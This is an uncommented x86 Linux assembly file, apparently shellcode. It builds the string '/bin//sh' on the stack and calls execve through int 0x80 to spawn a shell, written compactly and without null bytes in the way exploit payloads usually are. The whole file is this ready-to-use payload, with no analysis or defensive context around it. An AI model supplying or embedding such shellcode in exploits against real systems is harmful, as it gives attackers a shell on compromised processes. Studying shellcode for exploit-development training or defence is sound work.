global _start

section .text
_start:
	xor eax, eax
	xor ebx, ebx
	sub ecx, ecx
	mov edx, ecx

	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push edx
	push esp
	mov ecx, esp
	mov al, 0x0b
	int 0x80
